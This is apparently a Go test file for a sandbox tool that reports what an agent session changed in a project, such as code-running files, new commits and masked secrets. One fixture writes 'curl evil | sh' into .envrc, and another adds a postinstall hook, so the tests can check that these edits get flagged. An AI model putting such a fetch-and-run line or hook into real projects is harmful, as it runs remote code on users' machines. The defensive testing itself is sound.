package changereport

import (
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"kota/internal/mask"
	"kota/internal/offlinegit"
)

const (
	idA = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
	idB = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
)

// fakeGit answers the git that a Check runs: show-ref with each of refs in
// turn (the last one from then on), and git log with log.
type fakeGit struct {
	refs []string
	log  string
	err  error
}

func (f *fakeGit) run(j offlinegit.Job) (string, error) {
	script := strings.Join(j.Cmd, " ")
	switch {
	case f.err != nil:
		return "", f.err
	case strings.Contains(script, "show-ref"):
		out := f.refs[0]
		if len(f.refs) > 1 {
			f.refs = f.refs[1:]
		}
		return out, nil
	case strings.Contains(script, "merge-base"):
		return "kept\n" + f.log, nil
	}
	return "", fmt.Errorf("unexpected job %q", script)
}

// commit is one commit as git log prints it for readHistory: files maps
// each path to its status letter.
func commit(id, subject string, files ...string) string {
	out := "\x01" + id + "\x00" + subject + "\x00\n"
	for i := 0; i+1 < len(files); i += 2 {
		out += ":100644 100644 " + idA + " " + idB + " " + files[i+1] + "\x00" + files[i] + "\x00"
	}
	return out
}

// moved is a fake whose main moves from idA to idB with log in between.
func moved(log string) *fakeGit {
	return &fakeGit{
		refs: []string{idA + " HEAD\n" + idA + " refs/heads/main\n", idB + " HEAD\n" + idB + " refs/heads/main\n"},
		log:  log,
	}
}

// gitProject is a project with its own .git directory, which is all
// ReadRefs looks for before it runs git.
func gitProject(t *testing.T) string {
	t.Helper()
	isolateGit(t)
	dir := t.TempDir()
	if err := os.Mkdir(filepath.Join(dir, ".git"), 0o755); err != nil {
		t.Fatal(err)
	}
	return dir
}

func report(t *testing.T, c *Check) string {
	t.Helper()
	var out strings.Builder
	c.Finish().Report(&out)
	return out.String()
}

func start(t *testing.T, project string, layout mask.Layout, run offlinegit.Runner, opts Options) *Check {
	t.Helper()
	c, err := Start(project, layout, run, opts)
	if err != nil {
		t.Fatal(err)
	}
	return c
}

// The issue 17 trial run: the session adds a devDependency and a
// postinstall script to package.json and edits .envrc, and the report
// names them or the command to see them.
func TestReportWorkingTree(t *testing.T) {
	isolateGit(t)
	project := t.TempDir()
	write(t, project, "package.json", `{"name":"app","devDependencies":{"vitest":"^1.0.0"}}`)
	write(t, project, ".envrc", "use flake\n")
	c := start(t, project, mask.Layout{}, (&fakeGit{}).run, Options{})
	write(t, project, "package.json", `{"name":"renamed","devDependencies":{"vitest":"^1.0.0","wrangler":"^4.0.0"},"scripts":{"postinstall":"node x.js"}}`)
	write(t, project, ".envrc", "use flake\ncurl evil | sh\n")

	want := fmt.Sprintf(`WARNING: the session changed 2 file(s) that can run code on the host. Review them before building, installing or opening the project in an editor:
  modified  .envrc
      see: git -C %[1]s diff HEAD -- .envrc
  modified  package.json
      devDependencies: added wrangler ^4.0.0
      scripts: added postinstall (runs on install) "node x.js"
`, project)
	if got := report(t, c); got != want {
		t.Errorf("report\n got:\n%s\nwant:\n%s", got, want)
	}
}

// A file placeholder the session wrote before Start and the cleanup
// removed isn't reported as deleted; a placeholder left with content is
// reported as added.
func TestReportLeavesOutPlaceholders(t *testing.T) {
	isolateGit(t)
	project := t.TempDir()
	layout := mask.Layout{Mounts: []mask.Mount{{Path: ".envrc", Placeholder: true}, {Path: "Makefile", Placeholder: true}}}
	write(t, project, ".envrc", "")
	write(t, project, "Makefile", "")
	c := start(t, project, layout, (&fakeGit{}).run, Options{})
	os.Remove(filepath.Join(project, ".envrc"))
	write(t, project, "Makefile", "all:\n")
	got := report(t, c)
	if strings.Contains(got, ".envrc") || !strings.Contains(got, "added     Makefile") {
		t.Errorf("report:\n%s", got)
	}
}

// Commits that touch a placeholder or a mask, or add a file the global
// excludes ignore, are warned about; masks and placeholders in .git aren't
// looked for, since git doesn't commit there.
func TestReportCommitWarnings(t *testing.T) {
	project := gitProject(t)
	config := t.TempDir()
	write(t, config, "git/ignore", ".claude/\n")
	layout := mask.Layout{Mounts: []mask.Mount{
		{Path: ".env", Mask: true},
		{Path: ".envrc", Placeholder: true},
		{Path: ".git", Dir: true, Pin: true},
		{Path: ".git/hooks", Dir: true, Placeholder: true},
		{Path: ".git/secret", Mask: true},
		{Path: "deploy/.aws", Dir: true, Mask: true},
		{Path: "githooks", Dir: true, Placeholder: true},
	}}
	git := moved(commit(idB, "agent",
		".env", "A",
		".envrc", "A",
		".git/hooks/pre-commit", "A",
		".git/secret", "M",
		".claude/settings.local.json", "A",
		"deploy/.aws/credentials", "A",
		"githooks/pre-push", "A",
		"README", "A"))
	c := start(t, project, layout, git.run, Options{ConfigHome: config})
	got := report(t, c)
	for _, want := range []string{
		"git history changed:\n  branch main moved\n  1 new commit(s):\n    bbbbbbb  agent\n",
		"WARNING: 5 path(s) in these commits need review",
		"  .envrc  held empty by kota, not in the project: added in bbbbbbb\n",
		"  githooks/pre-push  held empty by kota, not in the project: added in bbbbbbb\n",
		"  .env  masked secret, shown empty in the sandbox: added in bbbbbbb\n",
		"  deploy/.aws/credentials  masked secret, shown empty in the sandbox: added in bbbbbbb\n",
		"  .claude/settings.local.json  ignored by your global git excludes: added in bbbbbbb\n",
	} {
		if !strings.Contains(got, want) {
			t.Errorf("report lacks %q:\n%s", want, got)
		}
	}
	for _, unwanted := range []string{".git/", "README"} {
		if strings.Contains(got, unwanted) {
			t.Errorf("report names %s:\n%s", unwanted, got)
		}
	}
	before, after, ok := c.Finish().Refs()
	if !ok || before.Head != idA || after.Head != idB {
		t.Errorf("Refs = %v, %v, %v", before, after, ok)
	}
}

// Without a ConfigHome or core.excludesFile, nothing counts as globally
// ignored.
func TestReportNoGlobalExcludes(t *testing.T) {
	project := gitProject(t)
	git := moved(commit(idB, "agent", ".claude/settings.local.json", "A"))
	got := report(t, start(t, project, mask.Layout{}, git.run, Options{}))
	if strings.Contains(got, "WARNING") {
		t.Errorf("report:\n%s", got)
	}
}

// A No-history copy's history is "in the copy", and its working tree isn't
// reported, so a watched file changed only in a commit is flagged.
func TestReportCopy(t *testing.T) {
	project := gitProject(t)
	write(t, project, "package.json", "{}")
	git := moved(commit(idB, "agent", "package.json", "M"))
	c := start(t, project, mask.Layout{}, git.run, Options{Copy: true})
	if c.before != nil {
		t.Error("a copy's working tree was snapshotted")
	}
	write(t, project, "package.json", `{"scripts":{"postinstall":"x"}}`)
	got := report(t, c)
	for _, want := range []string{
		"git history changed in the copy:\n",
		"  package.json  can run code on the host, change not in the working tree: modified in bbbbbbb\n",
	} {
		if !strings.Contains(got, want) {
			t.Errorf("report lacks %q:\n%s", want, got)
		}
	}
	if strings.Contains(got, "the session changed") {
		t.Errorf("a copy's working tree was reported:\n%s", got)
	}
}

// Refs that can't be read don't stop the command; Report warns, and the
// Result has no refs to give.
func TestReportUnreadableRefs(t *testing.T) {
	project := gitProject(t)
	git := &fakeGit{err: errors.New("docker is not running")}
	c := start(t, project, mask.Layout{}, git.run, Options{})
	r := c.Finish()
	var out strings.Builder
	r.Report(&out)
	if want := "WARNING: could not record git refs, so commits made while it runs won't be checked: git show-ref: docker is not running\n"; out.String() != want {
		t.Errorf("report = %q, want %q", out.String(), want)
	}
	if _, _, ok := r.Refs(); ok {
		t.Error("Refs ok after a failure")
	}
}

// A project without a .git directory of its own has no history to report,
// and history that can't be read after the command is warned about.
func TestReportNoRepoAndFailedFinish(t *testing.T) {
	isolateGit(t)
	got := report(t, start(t, t.TempDir(), mask.Layout{}, (&fakeGit{err: errors.New("unused")}).run, Options{}))
	if got != "" {
		t.Errorf("report without a repository = %q", got)
	}

	project := gitProject(t)
	git := moved("")
	c := start(t, project, mask.Layout{}, git.run, Options{})
	git.err = errors.New("docker is not running")
	r := c.Finish()
	var out strings.Builder
	r.Report(&out)
	if !strings.Contains(out.String(), "WARNING: could not check for new commits: git show-ref: docker is not running") {
		t.Errorf("report = %q", out.String())
	}
	if _, _, ok := r.Refs(); ok {
		t.Error("Refs ok after a failure")
	}
}
